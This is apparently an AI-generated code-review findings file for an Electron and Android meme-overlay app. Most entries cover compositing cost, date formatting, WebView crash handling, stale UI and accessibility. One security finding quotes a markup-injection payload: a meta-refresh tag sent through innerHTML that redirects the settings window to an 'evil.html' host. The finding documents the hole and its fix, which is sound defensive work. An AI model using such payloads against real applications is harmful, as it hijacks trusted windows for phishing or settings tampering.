@@ -1,0 +1,149 @@
+## [?/?] css-pulse-compositing (medium,perf) overlay/src/styles.css:171 — Status pulses force per-frame blur and blend recomposition (about 55-60% of a core in software compositing)
+EVIDENCE: styles.css:171-172 and :667 run an infinite `pulse` on the pill dot (connecting/awaiting) and on the status icon. The dot sits inside `.pill` (backdrop-filter blur(6px), l.161), which sits inside the sticky `.topbar` (blur(14px), l.69). Underneath are a fixed full-viewport `.grain` with mix-blend-mode overlay (l.53-61) and `body::before` with filter blur(50px) (l.40-51). Its background is invalid (no comma after each rgba() stop, so getComputedStyle gives background-image 'none'), yet it still gets a 1100x1383 composited layer (CDP LayerTree). main.js:18 disables hardware acceleration. Measured with headless Chrome 153 --disable-gpu, DSF 1.5, CPU summed over all processes: awaiting 61%, connecting 54% of one core. Without grain, pill blur and ::before: 46%. Also without the topbar blur: 5-7%. Linked state (no animation): 1.3%.
+CHANGE: Each step was pixel-checked on all 4 tabs (Windows at DSF 1.5, phone at 412x915 @2.625).
+(1) Delete the dead `body::before` block (styles.css:40-51). Diff: 0.
+(2) Delete `.grain` (styles.css:53-61) and `<div class="grain"></div>` (settings.html:14, app.html:42). Max diff 1/255.
+(3) Drop `backdrop-filter: blur(6px)` from `.pill` (l.161). At most 4/255, on a few anti-aliased border pixels.
+(4) Biggest win: blur the sticky bar only once content is behind it. Move `backdrop-filter` and `-webkit-backdrop-filter` from `.topbar` to `.topbar.is-scrolled { ... }` and add to settings.js and app.js:
+```js
+const topbar = document.querySelector('.topbar');
+const syncTopbar = () => topbar.classList.toggle('is-scrolled', window.scrollY > 0);
+window.addEventListener('scroll', syncTopbar, { passive: true });
+syncTopbar();
+```
+At scrollY 0 only the flat page background is behind the bar (diff at most 7/255 on under 0.01% of pixels). If the owner wants the glow that body::before was meant to draw, restore it with the missing commas and without the blur; that is a visible change.
+BEHAVIOR: none (measured pixel diffs at most 4/255; up to 14/255 on about 40 anti-aliased pill-border pixels at 2.6x) | CROSS: settings.html:14 and android assets/app.html:42 (grain div). Step 4 needs settings.js and app.js changed together because styles.css is shared.
+RISK: Low. The CPU figures come from headless Chrome as a stand-in for Electron 33 software compositing, so absolute values will differ, but the ranking (topbar blur > grain > the rest) should hold. Android composites on the GPU, so the gain is smaller there but goes the same way.
+
+## [?/?] settings-innerhtml-navigation (medium,security) overlay/src/settings.js:105 — Server strings (pairing code, guild and user IDs) go through innerHTML and can navigate the settings window
+EVIDENCE: settings.js:105 does `serversTip.innerHTML = `...<code>/link ${code}</code>...`` with code = raw msg.code (main.js:440). :140 `ID ${g.id}` and :183 `ID ${b.id}` (links sent by the server) also go into innerHTML. The CSP stops scripts but not markup. Verified in Chrome with the real CSP: a code, guild id or blocked-user id of `<meta http-equiv="refresh" content="0;url=http://127.0.0.1:8765/evil.html">` navigated the page to that remote URL, through all 3 sinks. In Electron the preload runs on every navigation, so the remote page gets window.memedrop inside the trusted window: settings:set stores any key (main.js:629), plus openExternal, replay, etc. It could also show a phishing page there. This needs a malicious or compromised bot, or a ws:// MITM (ws:// is accepted).
+CHANGE: Render these values as text:
+```js
+// l.103-108
+serversTip.textContent = 'Pour ajouter un serveur, tape ';
+const tip = document.createElement('code');
+tip.textContent = `/link ${code || '<code>'}`;
+serversTip.append(tip, ' dessus.');
+// l.138-142 (same at l.183-184 with b.id / b.username)
+name.innerHTML = '<strong></strong><div class="server-row-sub"></div>';
+name.querySelector('strong').textContent = g.name || 'Serveur inconnu';
+name.querySelector('.server-row-sub').textContent = `ID ${g.id}`;
+```
+As extra protection:
+- Add `base-uri 'none'; form-action 'none'` to the CSP meta (settings.html:6); default-src does not cover these.
+- In main.js createSettingsWindow, add `settingsWin.webContents.on('will-navigate', e => e.preventDefault())` and `settingsWin.webContents.setWindowOpenHandler(() => ({ action: 'deny' }))`.
+app.js already uses textContent, so it needs no change.
+BEHAVIOR: none for legitimate data (same text and markup) | CROSS: optional: overlay/main.js createSettingsWindow (navigation guard)
+RISK: None. Output is identical for numeric codes and Discord snowflake IDs.
+
+## [?/?] history-intl-formatter-per-row (medium,perf) android/app/src/main/assets/app.js:307 — History rendering creates a new date formatter for every row (about 15x slower than needed)
+EVIDENCE: settings.js:257,266,335 and app.js:251,259,307 call toLocaleDateString/toLocaleTimeString('fr-FR', {...}) for each history row. With explicit options, V8 builds a new ICU formatter on every call. Measured in Chrome 153: 0.21 ms per call, versus 0.003 ms with a reused Intl.DateTimeFormat. settings.js renderHistory (20 rows): 6.4 ms, down to 0.41 ms. One Android push (onNativeState): 6.8 ms JS, or 9.6 ms with layout, down to 0.45 ms (2.0 ms with layout), on a desktop core. The text output is identical (checked). On Android this runs on every push (twice a second during an APK download, on each setting commit, each drop, every 30 s). On Windows it runs on each drop and every 60 s, even while the window is hidden.
+CHANGE: At the top of both files:
+```js
+// Formateurs créés une seule fois : toLocale*String(locale, options) en recrée un à chaque appel
+const FMT_HEURE = new Intl.DateTimeFormat('fr-FR', { hour: '2-digit', minute: '2-digit' });
+const FMT_JOUR  = new Intl.DateTimeFormat('fr-FR', { weekday: 'long', day: 'numeric', month: 'long' });
+const FMT_COURT = new Intl.DateTimeFormat('fr-FR', { day: 'numeric', month: 'short' });
+```
+settings.js: l.257 `return FMT_COURT.format(ts);`, l.266 `return FMT_JOUR.format(d);`, l.335 `const time = FMT_HEURE.format(h.ts);`.
+app.js: the same changes at l.251, l.259 and l.307.
+BEHAVIOR: none (identical strings: same locale and options) | CROSS: none
+RISK: Very low. Intl.DateTimeFormat exists on every target (Electron 33, WebView 80 and later).
+
+## [?/?] android-full-rerender-background (medium,perf) android/app/src/main/assets/app.js:404 — Android settings rebuild the full state and DOM on every Hub change, even in background
+EVIDENCE: app.js:404-409 calls the synchronous MD.getState() and then render() on every push, rebuilding the server list, blocked list and 20-row history. It also runs every 30 s (l.413). MainActivity.kt:52 adds the Hub listener in onCreate and l.64 removes it only in onDestroy, so pushes continue while the activity is stopped. Hub.changed() fires on each connection transition (2 per reconnect attempt while offline), each drop, each setting commit (MainActivity.kt:121), and every 500 ms during an APK download, even when progress has not changed or the download is paused (Updater.kt:95-120). Each time, stateJson() (MainActivity.kt:79-101) parses about 12 KB of history and the settings twice, and makes 2 binder calls (canDrawOverlays, isIgnoringBatteryOptimizations).
+CHANGE: app.js:
+```js
+let stale = false;
+window.onNativeState = () => {
+  // Activité en arrière-plan : on redessinera au retour
+  if (document.hidden) { stale = true; return; }
+  stale = false;
+  const next = readState();
+  if (!next) return;
+  S = next;
+  render();
+};
+document.addEventListener('visibilitychange', () => {
+  if (!document.hidden && stale) window.onNativeState();
+});
+```
+This turns the 30 s interval and background pushes into no-ops.
+Optional: in render(), skip renderServers, renderBlocked and renderHistory when a cheap key is unchanged, e.g. `JSON.stringify(S.links) + S.code` and `hist.length + ':' + (hist[0]?.ts || 0) + ':' + Math.floor(Date.now() / 60000)`.
+Kotlin (other files):
+- Add and remove the listener in onStart/onStop, and call pushState() in onStart.
+- In Updater.poll, call Hub.changed() only when `progress` changes.
+- Compute `perm` in onResume and onRequestPermissionsResult, and cache it in a @Volatile field.
+BEHAVIOR: none | CROSS: MainActivity.kt (listener lifecycle, perm cache) and Updater.kt poll (optional)
+RISK: Low. The guard relies on the WebView reporting document.hidden once the activity is stopped (AwContents hides its WebContents when the window becomes invisible; about 80% sure). If it does not, the guard never triggers and nothing regresses. The onStart/onStop change gives the same result either way.
+
+## [?/?] android-render-process-gone (medium,robustness) android/app/src/main/java/com/memedrop/app/MainActivity.kt:39 — A WebView renderer crash kills the whole app, including the foreground service
+EVIDENCE: Neither the settings WebViewClient (MainActivity.kt:39-48) nor the overlay's (OverlayController.kt:96-103) overrides onRenderProcessGone. Since API 26 the default returns false, and the WebViewClient docs say the app 'will crash if render process crashed, or be killed if render process was killed by the system'. Android WebView uses one renderer process per app. So if that renderer runs out of memory or crashes while a drop plays (a big GIF or video on a low-RAM phone), MemeDropService dies too whenever an unhandled WebView exists, for example the settings activity kept alive in background. This follows from the API contract; I did not reproduce it.
+CHANGE: MainActivity, in the client object at l.39:
+```kotlin
+override fun onRenderProcessGone(view: WebView, detail: RenderProcessGoneDetail): Boolean {
+    // Renderer (partagé avec l'overlay) perdu : on recrée l'écran plutôt que de laisser Android tuer le process (et le service)
+    webDead = true
+    recreate()
+    return true
+}
+```
+Add `private var webDead = false`, and in pushState() use `if (::web.isInitialized && !webDead)`, because the dead WebView must not be used again.
+OverlayController's client: `override fun onRenderProcessGone(view: WebView, detail: RenderProcessGoneDetail): Boolean { Hub.main.post { destroy() }; return true }`. The next drop recreates the WebView.
+BEHAVIOR: bugfix: a renderer crash no longer kills the foreground service | CROSS: OverlayController.kt:96 (both clients must handle it; one unhandled client is enough to kill the process)
+RISK: Low. API 26+, and minSdk is 26. onDestroy still calls web.destroy() on the dead view, which is allowed.
+
+## [?/?] opacity-slider-fill-init (low,bug) overlay/src/settings.js:631 — Opacity slider fill is drawn in the wrong place when the window opens
+EVIDENCE: settings.js:631 sets `opEl.style.setProperty('--value', `${opEl.value}%`)`, but #opacity has min=20 and max=100 (settings.html:300). bindRange (l.557) uses the correct `(v-min)*100/(max-min)`. Verified: with opacity 0.2 the fill covers 20% of the track while the thumb is at 0% ('--value' is '20%' at open, '0%' after the first input event), and the screenshot shows the blue fill running past the thumb. Lines 621, 626, 636 and 641 repeat the formula with hard-coded bounds.
+CHANGE: ```js
+function paintRange(el) {
+  el.style.setProperty('--value', `${(el.value - el.min) * 100 / (el.max - el.min)}%`);
+}
+```
+bindRange l.557 → `paintRange(input);`. init l.621/626/631/636/641 → `paintRange(volEl)`, `paintRange(musicVolEl)`, `paintRange(opEl)`, `paintRange(durEl)`, `paintRange(vidDurEl)`. This is the same helper as app.js:340.
+BEHAVIOR: bugfix: the opacity fill matches the thumb when the window opens (other sliders unchanged) | CROSS: none
+RISK: None.
+
+## [?/?] blocked-card-stale-when-unlinked (low,bug) overlay/src/settings.js:392 — Blocked-users card stays visible, with dead buttons, after disconnect, pause or unlink
+EVIDENCE: On every state, applyConnState (settings.js:389-395) hides the pairing, linked, servers and status cards, but not blockedCard. renderBlockedPanel only runs in the 'linked' case (l.415). Verified: after a 'disconnected' or 'paused' push the 'Utilisateurs bloqués' card stays visible. Clicking 'débloquer' calls unblockUser, and main's wsSend() returns false when there is no socket (main.js:386-389, 674-675), so nothing happens and there is no feedback. After 'unlinked' the previous account's list stays on screen. Android hides it when not linked (app.js:198-200).
+CHANGE: In the reset block of applyConnState (after l.395), add `blockedCard.classList.add('hidden');`. renderBlockedPanel() shows it again in the 'linked' case.
+BEHAVIOR: bugfix: the blocked list is hidden when not linked, as on Android | CROSS: none
+RISK: None.
+
+## [?/?] hidden-settings-timers-stale-displays (low,bug) overlay/src/settings.js:234 — Hidden settings window keeps polling every 30/60 s and keeps a stale display list
+EVIDENCE: On close the window is hidden, not destroyed (main.js:251-256), and main.js:19 disables background timer throttling. So after the first open, two intervals run around the clock. `setInterval(refreshQuietHours, 30_000)` (l.234) sends an IPC whose handler calls store.get, which in conf 10.2 re-reads and parses config.json. `setInterval(() => renderHistory(historyEntries), 60_000)` (l.366) rebuilds the full history DOM (6.4 ms measured). Separately, listDisplays() runs only once, in init (l.654). A monitor plugged in later never appears until restart. If the stored overlayDisplayId no longer exists, the select is blank (verified: selectedIndex -1), while main actually uses the primary display (main.js:134-142).
+CHANGE: ```js
+setInterval(() => { if (!document.hidden) refreshQuietHours(); }, 30_000);
+setInterval(() => { if (!document.hidden) renderHistory(historyEntries); }, 60_000);
+document.addEventListener('visibilitychange', () => {
+  if (document.hidden) return;
+  refreshQuietHours(); renderHistory(historyEntries); refreshDisplays();
+});
+```
+Move l.654-667 into `async function refreshDisplays()` and call it from init(). It rebuilds the options, selects `wantedDisplay` (a module variable set from s.overlayDisplayId and updated in the #display change handler), then runs `if (sel.selectedIndex < 0) sel.value = 'primary';`.
+Alternative in main.js: destroy the window on close to free its renderer process. That requires flushing `_pending` on `pagehide`.
+BEHAVIOR: bugfix: the display list refreshes when the window is reopened, and a missing monitor shows 'Écran principal (auto)' (what main actually uses) instead of a blank select | CROSS: none (main.js only for the alternative)
+RISK: Low. Electron reports document.hidden after win.hide() or minimize for windows with backgroundThrottling on, which is the default for this window.
+
+## [?/?] google-fonts-render-blocking (low,perf) overlay/src/settings.html:10 — Google Fonts loaded from the network block first paint and contact Google on every open
+EVIDENCE: settings.html:8-10 and app.html:7-9 preconnect to fonts.googleapis.com and fonts.gstatic.com, then load the font CSS as a parser-inserted <link> in <head>. That blocks rendering and every script after it. Measured with the CSS delayed by 5 s (a local slow server standing in for a slow or captive network): first paint at 5240 ms, settings.js ran at 5247 ms, so the window stays blank and unusable. The preconnects open 2 TLS connections to Google on every page load (each MainActivity creation on Android), even when the CSS is cached. Users' IP and user agent go to Google (a GDPR concern, cf. LG München 2022), and an offline first run falls back to system fonts.
+CHANGE: Self-host the fonts:
+- Put woff2 latin subsets in overlay/src/fonts/: Bricolage Grotesque (variable, 500-800), JetBrains Mono (variable, 500-700), Instrument Serif italic. They are OFL-licensed, about 100-150 KB total.
+- Declare each in styles.css, e.g. `@font-face { font-family: 'Bricolage Grotesque'; src: url('fonts/bricolage.woff2') format('woff2'); font-weight: 500 800; font-display: swap; }`.
+- Delete settings.html:8-10 and app.html:7-9.
+- In the settings.html CSP, use `font-src 'self'` and drop https://fonts.googleapis.com from style-src.
+- Add "fonts/**" to the include in syncWebAssets (android/app/build.gradle.kts:12).
+Note: fonts.googleapis.com returns 403 through this sandbox's proxy, so the owner has to fetch the files.
+BEHAVIOR: none once the fonts are bundled (same typefaces); offline and first runs get the real fonts | CROSS: android/app/build.gradle.kts syncWebAssets; settings.html CSP
+RISK: Low. Adds about 150 KB per package, and the OFL license text must ship with the fonts. It cannot be done here without the font files.
+
+## [?/?] settings-a11y-gaps (low,bug) android/app/src/main/assets/app.js:21 — Screen-reader gaps: Android tabs expose no state, unlabeled images, identical switch names
+EVIDENCE: app.html:62-67: the tab buttons have no role or aria-selected, and showTab (app.js:21) only toggles a CSS class, so TalkBack cannot tell which tab is active (settings.js:61 does set aria-selected). app.js:193 (guild icons) and :311 (20 history avatars) create <img> without alt, so each is read as an unlabeled image (settings.js sets alt=''). settings.js:144-148: the per-server switches have no label, only the title 'Cliquer pour désactiver ce serveur' when checked, so every switch gets the same name and none includes the server's name. In settings.html, the panels behind the role="tab" buttons lack role="tabpanel".
+CHANGE: - app.html:62: `<nav class="tabs" role="tablist">`, and `role="tab"` on the 4 buttons.
+- app.js:21: `tabs.forEach(t => { const on = t.dataset.tab === name; t.classList.toggle('active', on); t.setAttribute('aria-selected', String(on)); });`.
+- app.js:193 `pic.alt = '';` and :311 `img.alt = '';`.
+- settings.js after l.148: `sw.setAttribute('aria-label', `Recevoir les drops de ${g.name || 'ce serveur'}`);`.
+- Add `role="tabpanel"` to the .tab-panel divs in both HTML files.
+BEHAVIOR: none visually; screen readers get correct names and states | CROSS: app.html and settings.html markup
+RISK: None.
+
